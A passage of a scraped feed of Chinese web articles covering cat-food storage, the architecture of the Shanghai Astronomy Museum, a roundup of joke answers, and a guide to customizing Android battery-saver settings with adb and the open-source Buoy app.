src=\"https://pic1.zhimg.com/v2-73022269d6d5ba95d917f2f8e2cfe186_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图：小红书网友 </figcaption></figure><p><strong>存啥：</strong>日常要吃的、或分装后的猫粮</p>\n<p><strong>优点：</strong>用途广，方便好看，开盖即取。极其适合北方干燥地区，放在这种桶里就足够了，甚至根本用不上酵素桶或者真空机。</p>\n<p><strong>缺点：</strong>市面花样太多，容易踩雷买到质量不好不密封的，所以要铲屎官用心去挑选，网评日本爱丽思、华元宠具还算是不错的～</p>\n<p><strong> </strong><strong>补充：</strong><strong>随时要吃的猫粮如何储存？</strong><strong>一、矿泉水瓶 | 玻璃罐 | 小号储粮桶</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8fa0ed78517e10e77c7f844815e8c440_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>存啥：</strong>采用<strong>每日定量自由采食</strong>方法的，用一个小盒子放日常随时要吃的~</p>\n<p><strong>优点：</strong>矿泉水瓶 0 成本，玻璃密封罐循环利用，小号储量桶自带量杯！</p>\n<p><strong>缺点：</strong>矿泉水瓶密封性一般，可能存在风险。坐标南方沿海地区，我亲身试用了 7 个月吧，目前还没有出现发霉生虫变脆的情况~其他的当然会安心一点，总比老打开猫粮袋取粮要好，降低了二次污染的风险~~</p>\n<p><strong>二、豪华自动喂食器</strong></p>\n<p><strong>存啥：</strong>采用<strong>定时定量</strong>方法的，就需要买一个自动喂食器啦~</p>\n<p><strong>优点：</strong>可以控制好猫咪的食量，避免猫咪一下吃过多软便的肠胃问题（亲身经历...）</p>\n<p><strong>缺点：我本人没有用过。</strong>据网友经验，有几率会导致卡粮问题，自动喂食器成本比较高，我也还在观望中，希望用过的朋友积极在评论区补充意见哦！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/279414065\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738381"},{"title":"全球建筑规模最大的上海天文馆于2021年7月17日正式开馆，对此你有哪些期待？","date":"2021-07-22 23:06:30","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>建筑 职场提升 设计留学 媒体合作｜咨询微信：hurmus</span>\n<a href=\"https://www.zhihu.com/question/470374038/answer/2009804498\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>没有期待了，上海喜提全球最佳的天文馆！</strong></p>\n<p>今天是上海天文馆开馆的第三天。三天前的那周，大量的媒体朋友来找我这位“ennead 老熟人”约稿获取最“独家”的信息和报导。但我全部回绝了，并不是不给面子，只是这项目太漫长，一时之间不知从何写起……</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/391348701\">世界最大天文馆开幕，上海离外太空更近一步</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1400838781403090944\" target=\"_blank\"><img src=\"https://pic3.zhimg.com/v2-3e3d19f836145cf1d8563c0472eb9222.png\" alt=\"\"><span><span>上海天文馆概念动画 - ennead<span></span><span></span></span><span><span></span>https://www.zhihu.com/video/1400838781403090944</span></span></a></p>\n<p><strong>一位建筑师，能有多少个八年？</strong></p>\n<p>2014 年上海天文馆中标时，我还是纽约的小顾问；之前在国际事务所工作的时候，也参与过不少这类文化地标项目的竞赛和深化。<strong>但了解这个方案后，还是被设计逻辑性和形式语言的美感契合度震撼到了。</strong>一年后，因为这个项目扩展与主创 Thomas&amp;Grace 的人格魅力加持下，我加入 ennead 事务所。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fddb30f0d083f3dcddc19eecacfcfc9e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><p>自项目 2013 年竞赛启动，2014 年中标到 2021 年开馆，一晃过去八年。作为最初参与竞标的建筑师团队，与这座“地标”建筑长达八年的磨砺。<strong>翻看过往文本不经感叹，做建筑师是重大的人生承诺，人生能有多少个八年去完成一座重大项目？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0389552b3ad35b458cf13871cd059817_720w.jpg?source=8673f162\" alt=\"\"><figcaption>上海天文馆最后一次概念竞标方案汇报文本</figcaption></figure><hr>\n<p><strong>为什么建在离市区那么远的临港新城？</strong></p>\n<p>世界上最大的天文馆——上海天文馆，坐落于临港新城滴水湖畔；作为上海科技馆分馆，总规划用地面积 5.86h㎡，占地约 3.8 万㎡（相当于 5.5 个标准足球场大小）。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-87960076e4326b253365a21009295133_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><p>当时选址考虑到两个较为重要的问题：</p>\n<ol>\n<li>寸土寸金的上海市中心，<strong>难以整块拨出如此巨大的用地</strong>来支持全世界最大的天文馆建设。因此考虑正在建设开发的临港新城；</li>\n<li>市中心的办公与商业建设量密集，<strong>人造光较强，对天文观测有一定的影响</strong>。因此需要选择类似位于佘山天文台这样光环境较暗位置；</li>\n</ol>\n<p>上海天文馆不仅是教育科普类场馆（需要地铁公交直达），同时也是科研观测天文台（需要较稳定光环境），在这两个要素的综合考虑下，临港新城是一个非常不错的选择。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-946bb66af2a7af76f82f8f14ca32dd1c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><hr>\n<p><strong>上海天文馆不是一座建筑，而是一组建筑群。</strong></p>\n<p>天文馆包含了临时展区和常设展区、高约 24m 的太阳望远镜、天文台、光学天文馆、教育和研究中心，以及天空数字剧场等一系列建筑实体。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ced6af30a13020559591290ebfabc502_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><p><strong>而最引人注目的是三大建筑元素——圆洞天窗、倒置穹顶和天象厅球幕。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6b79d14507dae77f5fd5afdd0bbe0064_720w.jpg?source=8673f162\" alt=\"\"><figcaption>分析图© ennead</figcaption></figure><p>在设计过程中，我们希望打造一个可以将天文馆的功能和建筑实体完全融合的存在，让建筑本身兼具观测与科普教学意义，<strong>将人类对天文的认知融入到设计之中，让游客在迈入天文馆之前便能从建筑外观完整地获得这一体验，而在参观的尾声，通过直接与星空接触，还可以感受宇宙的浩瀚无边，而这整个旅程都离不开空间本身的支撑。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ebbae0a8ad8b490b653733774ca5613d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>部分设计草图© ennead</figcaption></figure><p>因此天文馆的建筑外形源自于宇宙运行的中难以被解答的：<strong>三体问题，天体力学中的基本力学模型。</strong>它是指三个质量、初始位置和初始速度都是任意的可视为质点的天体，在相互之间万有引力的作用下的运动规律问题。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1e5d7e31f66c82119a815f5264394b71_720w.jpg?source=8673f162\" alt=\"\"><figcaption>分析图© ennead</figcaption></figure><blockquote>三体问题（three-body problem）最简单的一个例子就是<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%25A4%25AA%25E9%2598%25B3%25E7%25B3%25BB/173281\" target=\"_blank\" rel=\"nofollow noreferrer\">太阳系</a>中<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%25A4%25AA%25E9%2598%25B3/24010\" target=\"_blank\" rel=\"nofollow noreferrer\">太阳</a>、<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%259C%25B0%25E7%2590%2583/6431\" target=\"_blank\" rel=\"nofollow noreferrer\">地球</a>和<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E6%259C%2588%25E7%2590%2583/30767\" target=\"_blank\" rel=\"nofollow noreferrer\">月球</a>的运动。在浩瀚的<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%25AE%2587%25E5%25AE%2599\" target=\"_blank\" rel=\"nofollow noreferrer\">宇宙</a>中，星球的大小可以忽略不计，所以我们可以把它们看成<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E8%25B4%25A8%25E7%2582%25B9/495707\" target=\"_blank\" rel=\"nofollow noreferrer\">质点</a>。如果不计太阳系其他星球的影响，那么它们的运动就只是在<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E5%25BC%2595%25E5%258A%259B/2679081\" target=\"_blank\" rel=\"nofollow noreferrer\">引力</a>的作用下产生的，所以我们就可以把它们的运动看成一个三体问题。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-53f06b79edc08d4ad5e741c26dc015ba_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三体空间设计草图© ennead</figcaption></figure><hr>\n<p><strong>上海天文馆不是一座建筑，而是一系列观测仪器。</strong></p>\n<p><strong>1. 圆洞天窗位于天文馆主入口处</strong>，阳光穿过圆洞时会在地面形成光斑，且随着太阳在天空中的移动，光斑也会随之移动到地面的入口广场和反射池，以记录时间的流逝。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3b0ef4ec6ef2d6f7c9049a0276133f2c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-2c31a204abe864e0bfabdfa127e36399_720w.jpg?source=8673f162\" alt=\"\"><figcaption>© ennead</figcaption></figure><p><strong>夏至正午时分，光斑则会与天文馆入口广场地面上的圆形标志完美重合，成为节气标志。</strong>整个圆洞天窗好似一个日晷，无时无刻都在捕捉光影，记录时间。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-75ede4098e8b68f09f00b2af83f5360a_720w.gif?source=8673f162\" alt=\"\"><figcaption>延时摄影 © ennead/ 胡艺怀摄影</figcaption></figure><p>为了达成这一体验，<strong>我们设计了一个弧形的混合钢带桁架来实现巨大的悬挑结构，向外出挑 40m。</strong>一个如倒置圆锥的圆洞天窗穿透了建筑的悬臂，天窗的金色饰面反射阳光，在其下的墙面和地面留下斑驳细碎的金色投影，呼应着圆形平台边的一弯浅水。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2ed1fd1ecb91773bd9ff139143369705_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><p><strong>2.天象厅“悬浮”的球幕影院，借助于最小化可视支撑，使人们能够体验到失重或反重力的视觉状态。</strong>球体形态的设计参考了星球的原始形状，正如通过辨别太阳或月亮的位置可以获得方向感一样，天象厅球体也可以作为方向参照物。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3617bf57fabf53fc274269dde7c2044f_720w.gif?source=8673f162\" alt=\"\"><figcaption>延时摄影 © ennead/ 胡艺怀摄影</figcaption></figure><p>在设计过程中，<strong>我们做了大量的阳光轨迹模拟，确定了球幕影院悬浮的高度、天窗和地面坐标系等要素。</strong>球体的形状不仅来自于设计元素本身的要求，也是对天体原始形态的一种抽象展现，其顶端嵌于天文馆较低裙楼的屋顶之上，整个球体宛如从地平线末端冉冉升起的新星。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c6c35f25b9bedb3cee95e5f1e9c1187d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a675bd16e88960f0f675509f31cee959_720w.jpg?source=8673f162\" alt=\"\"><figcaption>© ennead</figcaption></figure><p>当游客环绕建筑行走时，球体将逐渐进入人们的视野，仿佛正从其他星球逐渐靠近这一新的星球，<strong>且置身于球体下方时，还会体验到“超尺度”对于渺小人类带来压迫感。</strong>为了实现球体的漂浮感，结构上消除尽可能多的柱子来加强视觉上的幻觉。<strong>由拱形弧墙支撑，挑出 6 个非常小的“梁”来悬挂这个直径 29m 的球幕影院。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-67124783220107255c4d0da07416f938_720w.jpg?source=8673f162\" alt=\"\"><figcaption>© ennead</figcaption></figure><p><strong>3.倒转穹顶将成为整段游历的终点，观者再一次走出室外拥抱星空。</strong>倒转穹顶，一个巨大的倒置玻璃张拉结构承载着游客，“屏蔽”周围的一切，将视野放在包罗万象的天空上。倒转穹顶采用了一个巨大的倒置玻璃张拉结构，它位于天文馆中庭顶部，游客可以置身其中，静观天空，思考宇宙。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-62e7974a75346084e2db0c841cb97c37_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><p><strong>倒转穹顶的下方设有 720 度螺旋形坡道，从主建筑自然地向外延伸出去</strong>，象征着星系的旋臂，并将游客的目光逐渐吸引至建筑的顶端。作为参观之旅的高潮部分，倒转穹顶能够“屏蔽”城市的喧嚣和周围的一切，将游客的注意力集中在包罗万象的天空上，享受与宇宙的真实邂逅，并为天文馆体验之旅画上圆满的句号。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-da5aae9d1c6fe80fc2d6f5dc4a709ae2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-9e4015ae415c0f364ef72a0d4a6bcf3c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>实景拍摄 © ennead/ 存在</figcaption></figure><blockquote>\n<strong>一个负责任的现代天文馆应当肩负起向大众传播科学知识的职责。</strong>天体物理学家 James Sweitzer 说：“至少有四个基础部分是一个天文馆不可缺少的——一个天文知识初级学习区域，天体物理学概论介绍空间，宇宙发现史空间，教育实验室和天文台。”Ennead 则以一种时空穿梭的叙事方式设计展览空间。<sup>[1]</sup>\n</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-21a52856ddbec87f4e0d36d46c6fb4b1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>展厅实景 © ennead/ 存在</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-f878ac03e8b8aa45bdc67e34c6a2e4b5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>展厅实景 © ennead/ 存在</figcaption></figure><p>附上最终建成的项目视频给各位知友种个草；<strong>作为认知我们生存环境的终极问题，天文科普任重道远。</strong>有机会希望各位可以去亲身体验！</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1400899708550860800\" target=\"_blank\"><img src=\"https://pic1.zhimg.com/v2-6025dafd6c0f52eb8375845ba57f5f43.jpg?source=382ee89a\" alt=\"\"><span><span>上海天文馆的漫游体验 - ennead<span></span><span></span></span><span><span></span>https://www.zhihu.com/video/1400899708550860800</span></span></a></p>\n<p><strong>最后，建筑师福利时刻！技术图纸给大家作为学习参考资料：</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c1783d6124778dc60dda1f34473e43eb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>一层平面图 © ennead</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-2a41c470859f1492141d560d62829b8c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>二层平面图 © ennead</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-c2223348c715261d63a9f66ab86141e6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三层平面图 © ennead</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-dd2f7e5a7901aa06e431b619331561fb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>屋顶平面图 © ennead</figcaption></figure><blockquote>建筑师：ennead architects LLP<br>项目年份: 2021<br>建筑面积: 38,000㎡<br>项目地址: 上海市浦东新区临港大道 380 号<br>主创建筑师: Thomas Wong<br>设计团队: Thomas Wong, V. Guy Maxwell, Grace Chen 陈昕昉, Wei Wei Kuang 邝薇薇, Charles Wolf, Anthony Guaraldo, Jorge Arias, Margarita Calero, Michael Caton, Christina Ciardullo, Eugene Colberg, Regina Jiang, Jörg Kiesow, Aidan Kim, Stefan Knust, Xinya Li 李欣亚, Francelle Lim, Xiaoyun Mao, David Monnar, Nikita Payusov, James Rhee, Yong Kyun Roh, Miya Ruan 阮玲丽, Na Sun, Eric Tsui 徐震, Stephanie Tung, Charles Wong 黄泽修, David Yu 于乐川, Fred Zhang<br>委托方：上海科技馆<br>当地设计院：上海建筑设计研究院有限公司‍‍‍‍‍‍<br>展陈设计：飞来飞去<br>摄影师：Arch-Exist；延时摄影师：胡艺怀</blockquote>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/470374038\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738377"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-22 23:06:20","description":"\n<div>\n<h2>哪个瞬间你突然觉得读书真没用？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-b48934dac3f644a5afb9f7ac97dd2de0_l.jpg?source=8673f162\"><span>Conway Young，</span><span>知乎不是庸者的百度。</span>\n<a href=\"https://www.zhihu.com/question/36839125/answer/90122576\" hidden>阅读原文</a>\n</div>\n<div>\n当我女朋友生气的时候。\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/36839125\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>郭德纲在台上被泼水会怎么样？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a2f8d3d0b63b0adebee6388e0ada671c_l.jpg?source=8673f162\"><span>TraHeart，</span><span>一场竹节虫的美梦。</span>\n<a href=\"https://www.zhihu.com/question/333176570/answer/777096050\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢谢您呐，我家里头热得快炸了</p>\n<p>_(:_」∠)_</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/333176570\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你见过最丑的猫是怎样的？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-bdc24271bc4dc2ed811d2b071c91297c_l.jpg?source=8673f162\"><span>一只小牌九，</span><span>这位姑娘，可否与小生共推牌九啊？( •̀∀•́ )</span>\n<a href=\"https://www.zhihu.com/question/366187250/answer/982594243\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个回头，谁遭得住？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a99d66d99aa64fb961ac2dd15ea94fbb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-43068a342926b82297e77312ab3202aa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8fd4a118760a7e816abcfb96b097b1d5_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/366187250\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>女生不会接吻怎么办呢？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/303279064/answer/591091340\" hidden>阅读原文</a>\n</div>\n<div>\n<p>买一桶的星球杯，丢掉勺子。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/303279064\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何看待警方通报吴亦凡事件：一男子冒充涉事双方对吴与都二人进行诈骗？有哪些信息值得关注？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-3bde00efc77f1c6f53d8316c6f629268_l.jpg?source=8673f162\"><span>编辑部小李，</span><span>知乎第一大号背后的难人</span>\n<a href=\"https://www.zhihu.com/question/474051299/answer/2013904669\" hidden>阅读原文</a>\n</div>\n<div>\n<p>朝阳警方提醒您：一切以转账为目的的聊天都是诈骗。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/474051299\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738402"},{"title":"Android 省电模式自定义，打造更适合自己的长续航体验","date":"2021-07-22 09:10:24","description":"\n<blockquote><p>如果打开手机的省电模式，手机会发生什么改变？</p></blockquote>\n<p>在过去使用旗舰机的几年里，续航焦虑一直萦绕在我使用手机的每一个瞬间，对于消费者来说延长手机续航最直接的办法就是点击系统里的省电模式/低电量模式开关，但随之而来手机的功能就会发生一系列变化，这些所有的变化都是被手机厂商预先定义的。</p>\n<p>以搭载 iOS 的 iPhone 为例，<a href=\"https://support.apple.com/zh-cn/HT205234\" target=\"_blank\">打开低电量模式</a> 会暂停电子邮件获取、后台应用刷新、自动下载以及在视觉上减弱部分视觉效果、降低屏幕亮度等。除此之外，iOS 也会暂时降低 iPhone 处理器芯片的峰值性能以获取更高的能效比<sup class=\"ss-footnote\" href=\"\" title=\"一般来说越接近峰值性能，就要付出更多的单位能耗，能效比越低。这也是为什么部分手游玩家戏称低电量模式为「游戏模式」，发热更小，性能表现更持久。\" footnote-id=\"1\">1</sup>。</p>\n<p>而在 Android 上因为厂商众多，几乎每家厂商都对省电模式有着自己的理解和想法，也就推出了不同的省电模式政策，甚至还会强行停止应用的后台<sup class=\"ss-footnote\" href=\"https://dontkillmyapp.com/\" title=\"「杀应用后台耻辱柱」\" footnote-id=\"2\">2</sup>。与此同时，Google 似乎省电模式的行为考量也在不断变化，几乎每个大版本 Android 更新都会对此作出改动，以四年前的 Android O 为例，开启省电模式后状态栏和导航栏都会有一条大红边，所有过渡动画都被强行关闭，可谓体验极差。而次年到了 Android P，省电模式下这些极度影响使用体验的「大红条」统统不见，动画也回归，转而通过更积极地限制应用后台来节省电量<sup class=\"ss-footnote\" href=\"https://developer.android.com/about/versions/pie/power?hl=zh-cn\" title=\"Android 9 电源管理改进\" footnote-id=\"3\">3</sup>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/31db39c7e5dfbd9fac01baad06ecbf86.jpg\"><figcaption>找截图太难了，不如直接从办公室翻一台旧手机吧，猜出有奖。</figcaption></figure><p>而在今天，如果你开启了省电模式，你的 Android 手机可能还会 <a href=\"https://www.theverge.com/2018/11/8/18076502/google-dark-mode-android-battery-life\" target=\"_blank\">强制开启暗色主题</a>、关闭待机时的常亮显示（AOD）、关闭震动反馈……除此之外，如果你足够细心，你还会感觉到屏幕变暗、开启应用的速度变慢等一系列因为省电模式带来的功能牺牲。</p>\n<h2>省电模式带来的尴尬</h2>\n<p>难道所有的尴尬都来自于一厢情愿？</p>\n<p>省电模式背后所被定义的那些行为都是被强制执行的，厂商也不会根据机型硬件不同来特殊调整，某个厂商旗下千奇百怪的机型却要面对同一个省电模式，可能导致的结果就是对症不对药，用得还不爽：我的手机是明明 LCD 屏幕，启用暗色主题并不会让手机变得更省电，出行的时候却因为此让我看不清屏幕上内容……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/d603424cdb9652465d1bdf1dd8beb4f6.gif\"></figure><p>另一方面，我日常相当依赖 AOD 显示，它可以使我在工作或是娱乐时瞄一眼桌上的手机，就可以得知当前时间、错漏的通知信息，而无需我用手擡起或是点亮屏幕。Google 没良心的，这解放双手的好功能居然和省电模式相斥，二者只能存一。</p>\n<p>究其背后原因，一来厂商所假想的省电模式的使用场景过于单一，「手机没电了才开启」，而不会想到当下已经有许多用户开始灵活应用，比如在长时间工作闲置手机时开启省电模式减少待机耗电，或是出于对机型续航不满，日常开启使用等多种场景。二来则是 Google 的奇怪做法，诸如省电须要暗色，这只适用于 Pixel 和其他 OLED 设备，怎能轻率推向全阵营。</p>\n<h2>用命令行的确是麻烦了一点儿</h2>\n<p>这点不痛不痒的问题难不倒我们的极客们。AOSP 的省电模式政策其实都开放了 <a href=\"https://android.googlesource.com/platform/frameworks/base/+/master/services/core/java/com/android/server/power/batterysaver/BatterySaverPolicy.java\" target=\"_blank\">源代码</a> ，而且可以通过 adb 调试桥以命令行的方式进行更改，无需 Root 权限。</p>\n<p>首先当然是安装完毕 adb 调试桥，具体教程 Windows 上可以参照 <a href=\"https://sspai.com/post/40471\" target=\"_blank\">这篇文章</a>。如果不想安装的话，其实 <a href=\"https://app.webadb.com/#/\" target=\"_blank\">WebADB</a> 和 <a href=\"https://adb.http.gs/\" target=\"_blank\">Adb在线执行器</a> 理论上也能让你通过浏览器来对设备进行 adb 调试。</p>\n<pre class=\"language-shell\"><code>adb shell # 开启 adb 终端连上手机\ndumpsys power | grep -A 128 \"Battery saver policy\" # 查看省电模式的政策</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/173de7284d6cd277b2cecf6eb38dc941.png\"></figure><p>在返回的结果中我们可以看到 <code>battery_saver_constants</code> 这个参数，我们可以通过修改它的值来自定义省电模式的参数：</p>\n<pre class=\"language-shell\"><code>settings put global battery_saver_constants \"advertise_is_enabled=true,datasaver_disabled=true,enable_night_mode=true,launch_boost_disabled=true,vibration_disabled=true,animation_disabled=false,soundtrigger_disabled=true,fullbackup_deferred=true,keyvaluebackup_deferred=true,firewall_disabled=true,gps_mode=2,adjust_brightness_disabled=true,adjust_brightness_factor=0.5,force_all_apps_standby=true,force_background_check=true,optional_sensors_disabled=true,aod_disabled=true,quick_doze_enabled=true\"</code></pre>\n<p>修改其中的 <code>true</code> 或者 <code>false</code>，执行命令后就可以写入到手机系统中，一般来说重启也不会失效，但不排除部分厂商会设置在手机开机的时候覆写成默认参数，比如看起来非常老实的 Sony。</p>\n<p>想要回归默认参数的话也相当简单：</p>\n<pre class=\"language-shell\"><code>settings delete global battery_saver_constants</code></pre>\n<p>等等，每一次改动都需要连上电脑敲命令？这也太麻烦了，参数都还没来得及摸透，我就已经开始否定这种方案了。另一方面，我也希望省电模式能有不同力度的划分，以索尼手机系统为例，哪怕是省电模式（STAMINA Mode）也有「性能优先」与「省电优先」等多个不同的策略，方便用户根据场景切换。</p>\n<p>好在终于有开发者站了出来，开发了一款 <a href=\"https://github.com/tytydraco/Buoy\" target=\"_blank\">开源</a> 应用 <a href=\"https://play.google.com/store/apps/details?id=com.draco.buoy&amp;hl=en_US&amp;gl=US\" target=\"_blank\">Buoy</a>，让我们可以通过图形界面来控制系统省电模式的具体政策。</p>\n<h2>图形化界面定制你的省电模式</h2>\n<p>修改省电模式的策略并不一定需要 root 权限，如上文所示，只使用 adb 调试桥应该就能做到；同理 Buoy 也针对设备 root 与否提供了两种授权方式。以不方便 root 的三星和索尼为例，在命令行中直接打出 <code>adb shell pm grant com.draco.buoy android.permission.WRITE_SECURE_SETTINGS </code>进行授权即可。进入应用主界面后，在 Configuration 项下有罗列所有能够更改的省电模式行为，同时开发者也贴心地附上了一句话说明，来帮助我们理解每个开关背后代表的行为。</p>\n<p>接下来就简单分享一下我在使用中进行自定义的几个选项吧。</p>\n<p>Advertise power saver 其实就是让系统通知到应用手机正处于没电的警戒状态，希望应用能够「好自为之」，尽量少用一些电量。这个选项默认开启，我也不建议进行更改。</p>\n<p>Enable data saver 其实就是在开启省电模式的同时开启节省流量模式，大部分后台应用都跑不了流量，以此或许能起到省电的效用。这个选项默认关闭，我试了一下后觉得其实咱们社会主义人民也不缺流量，也就保持关闭了。</p>\n<p>Enable night mode 就是上文提到的在开启省电模式同时开启暗色模式。在 OLED 设备上我建议开启，的确能省不少电；在 LCD 设备上嘛就看你自己的喜好了。这个选项默认开启，十分恼人，建议学习 iOS 分开来控制比较人性化。</p>\n<p>Enable launch boost 意思就是在应用冷启动的时候让 CPU 无脑最大化输出性能，以尽可能缩短应用启动时间。应该是省电模式下唯一一个牺牲芯片性能的地方，实际体验下来开关与否差距还是比较明显的，开启应用的速度比较影响心情。此选项默认关闭，建议日常就使用省电模式/高效能中端芯片（比如骁龙 7 系列）用户开启来减少性能损失，旧旗舰芯片（如骁龙 835、845）等用户关闭来有效提升续航。</p>\n<p>Enable vibrations/Enable animations 这两个就一起说了，开启震动/开启动画。有些设备的震动反馈的确很带感，开了省电模式后还想继续体验的话就需要打开前者；觉得系统动画无所谓的话可以关闭后者，一键回到 Android 8 时代。</p>\n<p>Location mode 指的是开启省电模式后应用对于定位权限的调用。默认情况下是 All disabled when screen off，屏幕关闭时直接禁用所有定位请求，你也可以根据自己的需求来适当放松或收紧，我就没有更改。</p>\n<p>Adjust brightness 默认关闭，因为屏幕亮度过暗会直接影响我们的使用体验。不过这里我还是会手动打开并调节亮度比例，屏幕作为耗电大户，适当减少一些亮度不仅有助于省电，还能减少设备的发热情况<s>看看 iOS 在设备发热时强行大幅降低屏幕亮度就知道多有效了</s>。至于到底降低多少亮度就看个人喜好了，我会保持在 85~95 的较高值。</p>\n<p>Force apps into standby/Force backgroud check/Quick doze enabled 这几个我就一块说了，都是强化 Android 原生系统底层的省电机制如 Standby、Doze 来达成的，具体详情可以查看 <a href=\"https://sspai.com/post/47311\" target=\"_blank\">这篇文章</a> 。这三个选项默认都开启，我也都建议开启。</p>\n<p>Always-on-display enabled AOD 爱好者福音，就算再耗电也要开着的朋友们再也不用愁苦省电模式会关掉你们心爱的 AOD 了！此选项默认关闭，打开后即可在省电模式下继续使用 AOD。</p>\n<p>除了自己根据各个选项定义省电模式，我们还可以选择开发者预留的、从轻度到极限 4 种配置来调节省电模式的激进程度。若是能自定义这些配置文件就更好了，可以真正实现快捷切换不同程度的省电模式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/a2d7cd7696239f55fb1a6144dca29472.png\"><figcaption>新鲜火热的 Android 12 滚动截图</figcaption></figure><p>值得注意：</p>\n<ul>\n<li>Buoy 修改的是 Android 原生系统的省电模式，大多数厂商定制系统的「省电模式」可能会在此基础上进行补充添加（如三星 One UI），但也有部分定制系统抛开这套省电模式，独立制作一套。以 MIUI 为例，其开启「MIUI 